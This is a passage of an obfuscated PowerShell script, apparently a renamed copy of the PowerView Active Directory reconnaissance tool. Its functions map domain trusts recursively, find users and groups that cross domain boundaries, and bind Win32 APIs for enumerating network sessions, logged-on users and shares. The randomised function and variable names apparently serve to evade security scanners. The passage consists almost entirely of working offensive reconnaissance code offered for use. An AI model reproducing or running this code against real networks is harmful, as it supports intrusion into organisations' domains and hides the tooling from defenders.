                (skulked -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ).GetAllTrustRelationships()
            }     
        }
    }
}


function sequined {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $zWStlpoeAEeGomT
    )

    process {
        $qTONYcsNAoMmGCc = televisions -zWStlpoeAEeGomT $zWStlpoeAEeGomT
        if($qTONYcsNAoMmGCc) {
            $qTONYcsNAoMmGCc.GetAllTrustRelationships()
        }
    }
}


function ringer {


    [CmdletBinding()]
    param(
        [String]
        $IuM9ojehadqRMJF,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $LDAP,

        [Switch]
        $Okpdr9DpyZPCXBG,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    function caution {

        param(
            [String]
            $IuM9ojehadqRMJF,

            [String]
            $KKbtTlEQY9KtTfJ,

            [String]
            $ewHsaEFeoXOCPPv,

            [ValidateRange(1,10000)] 
            [Int]
            $WRYKTaHSEUSKduK = 200
        )

        if ($KKbtTlEQY9KtTfJ) {

            $QkYRUjBvtEtUQJH = "DC=" + $KKbtTlEQY9KtTfJ -replace '\.',',DC='
        }
        else {
            $QkYRUjBvtEtUQJH = [String] ([adsi]'').distinguishedname
            $KKbtTlEQY9KtTfJ = $QkYRUjBvtEtUQJH -replace 'DC=','' -replace ',','.'
        }

        Houyhnhnm -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -IuM9ojehadqRMJF $IuM9ojehadqRMJF -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Where-Object {$_.memberof} | ForEach-Object {
            ForEach ($pc9cLLCkKhiyqrs in $_.memberof) {
                $Index = $pc9cLLCkKhiyqrs.IndexOf("DC=")
                if($Index) {
                    
                    $ixXmoqr9dMQOIDf = $($pc9cLLCkKhiyqrs.substring($Index)) -replace 'DC=','' -replace ',','.'
                    
                    if ($ixXmoqr9dMQOIDf.CompareTo($KKbtTlEQY9KtTfJ)) {

                        $hIqWczrXxNjFAmP = $pc9cLLCkKhiyqrs.split(",")[0].split("=")[1]
                        $SDcHiIfIUdUoSUM = New-Object PSObject
                        $SDcHiIfIUdUoSUM | Add-Member Noteproperty 'UserDomain' $KKbtTlEQY9KtTfJ
                        $SDcHiIfIUdUoSUM | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $SDcHiIfIUdUoSUM | Add-Member Noteproperty 'GroupDomain' $ixXmoqr9dMQOIDf
                        $SDcHiIfIUdUoSUM | Add-Member Noteproperty 'GroupName' $hIqWczrXxNjFAmP
                        $SDcHiIfIUdUoSUM | Add-Member Noteproperty 'GroupDN' $pc9cLLCkKhiyqrs
                        $SDcHiIfIUdUoSUM
                    }
                }
            }
        }
    }

    if ($Okpdr9DpyZPCXBG) {

        if($LDAP -or $ewHsaEFeoXOCPPv) {
            $KrRNwLQC9tyCshX = squarer -LDAP -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $KrRNwLQC9tyCshX = squarer -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($IvYVRooOOIHTjAr in $KrRNwLQC9tyCshX) {

            Write-Verbose "Enumerating trust groups in domain $IvYVRooOOIHTjAr"
            caution -KKbtTlEQY9KtTfJ $IvYVRooOOIHTjAr -IuM9ojehadqRMJF $IuM9ojehadqRMJF -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
        }
    }
    else {
        caution -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -IuM9ojehadqRMJF $IuM9ojehadqRMJF -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }
}


function condor {


    [CmdletBinding()]
    param(
        [String]
        $hIqWczrXxNjFAmP = '*',

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $LDAP,

        [Switch]
        $Okpdr9DpyZPCXBG,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    function bisexuality {
        param(
            [String]
            $hIqWczrXxNjFAmP = '*',

            [String]
            $KKbtTlEQY9KtTfJ,

            [String]
            $ewHsaEFeoXOCPPv,

            [ValidateRange(1,10000)] 
            [Int]
            $WRYKTaHSEUSKduK = 200
        )

        if(-not $KKbtTlEQY9KtTfJ) {
            $KKbtTlEQY9KtTfJ = (skulked).Name
        }

        $wIgLsYnLlp9anjZ = "DC=$($KKbtTlEQY9KtTfJ.Replace('.', ',DC='))"
        Write-Verbose "DomainDN: $wIgLsYnLlp9anjZ"


        $QkNnOXDPSMF9B9y = @("Users", "Domain Users", "Guests")


        reapportioned -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Where-Object {$_.member} | Where-Object {

            -not ($QkNnOXDPSMF9B9y -contains $_.samaccountname) } | ForEach-Object {
                
                $hIqWczrXxNjFAmP = $_.samAccountName

                $_.member | ForEach-Object {


                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($wIgLsYnLlp9anjZ -ne ($_.substring($_.IndexOf("DC="))))) {

                        $EC9iKdhesKcX99B = $_.subString($_.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        $IuM9ojehadqRMJF = $_.split(",")[0].split("=")[1]

                        $FRxVjTWITQHj9NW = New-Object PSObject
                        $FRxVjTWITQHj9NW | Add-Member Noteproperty 'GroupDomain' $KKbtTlEQY9KtTfJ
                        $FRxVjTWITQHj9NW | Add-Member Noteproperty 'GroupName' $hIqWczrXxNjFAmP
                        $FRxVjTWITQHj9NW | Add-Member Noteproperty 'UserDomain' $EC9iKdhesKcX99B
                        $FRxVjTWITQHj9NW | Add-Member Noteproperty 'UserName' $IuM9ojehadqRMJF
                        $FRxVjTWITQHj9NW | Add-Member Noteproperty 'UserDN' $_
                        $FRxVjTWITQHj9NW
                    }
                }
        }
    }

    if ($Okpdr9DpyZPCXBG) {

        if($LDAP -or $ewHsaEFeoXOCPPv) {
            $KrRNwLQC9tyCshX = squarer -LDAP -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $KrRNwLQC9tyCshX = squarer -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($IvYVRooOOIHTjAr in $KrRNwLQC9tyCshX) {

            Write-Verbose "Enumerating trust groups in domain $IvYVRooOOIHTjAr"
            bisexuality -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
        }
    }
    else {
        bisexuality -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }
}


function squarer {

    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,

        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )


    $XSCKW9FUhfbODDF = @{}


    $TJNOdQcnTbkZiHt = New-Object System.Collections.Stack


    $iciMBcWeYJzrylT = (skulked).Name
    $TJNOdQcnTbkZiHt.push($iciMBcWeYJzrylT)

    while($TJNOdQcnTbkZiHt.Count -ne 0) {

        $KKbtTlEQY9KtTfJ = $TJNOdQcnTbkZiHt.Pop()


        if (-not $XSCKW9FUhfbODDF.ContainsKey($KKbtTlEQY9KtTfJ)) {
            
            Write-Verbose "Enumerating trusts for domain '$KKbtTlEQY9KtTfJ'"


            $Null = $XSCKW9FUhfbODDF.add($KKbtTlEQY9KtTfJ, "")

            try {

                if($LDAP -or $ewHsaEFeoXOCPPv) {
                    $pVvjrbPCVKmRxnm = Trojans -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -LDAP -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                }
                else {
                    $pVvjrbPCVKmRxnm = Trojans -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                }

                if($pVvjrbPCVKmRxnm -isnot [system.array]) {
                    $pVvjrbPCVKmRxnm = @($pVvjrbPCVKmRxnm)
                }


                $pVvjrbPCVKmRxnm += sequined -zWStlpoeAEeGomT $KKbtTlEQY9KtTfJ

                if ($pVvjrbPCVKmRxnm) {


                    ForEach ($Trust in $pVvjrbPCVKmRxnm) {
                        $MzQk9BBnMWxy9KV = $Trust.SourceName
                        $CzOooemXucyjPyU = $Trust.TargetName
                        $iDWtMcVDdBJiyoQ = $Trust.TrustType
                        $X9cWKtPNmHICwOd = $Trust.TrustDirection


                        $Null = $TJNOdQcnTbkZiHt.push($CzOooemXucyjPyU)


                        $IvYVRooOOIHTjAr = New-Object PSObject
                        $IvYVRooOOIHTjAr | Add-Member Noteproperty 'SourceDomain' "$MzQk9BBnMWxy9KV"
                        $IvYVRooOOIHTjAr | Add-Member Noteproperty 'TargetDomain' "$CzOooemXucyjPyU"
                        $IvYVRooOOIHTjAr | Add-Member Noteproperty 'TrustType' "$iDWtMcVDdBJiyoQ"
                        $IvYVRooOOIHTjAr | Add-Member Noteproperty 'TrustDirection' "$X9cWKtPNmHICwOd"
                        $IvYVRooOOIHTjAr
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}











$Mod = amputated -ModuleName Win32


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)


$iPxM9daDwriaFb9 = cramming $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$WuCrhpHJjhGgCyc = mudslinging $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $iPxM9daDwriaFb9
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}


$gzrDetqtx9fJmNR = mudslinging $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}


$KiXuYcc9rQyepbg = mudslinging $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}


$TqmGRofbOJ9wzcD = mudslinging $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}


$fsFNn9haqPXBWPN = mudslinging $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}


$Types = $FunctionDefinitions | frivolity -Module $Mod -Namespace 'Win32'
$F9W9FHKlTrkmIUF = $Types['netapi32']
$vLUOHGFDci9WFUb = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$vJXcemdbVhNyNQC = $Types['wtsapi32']
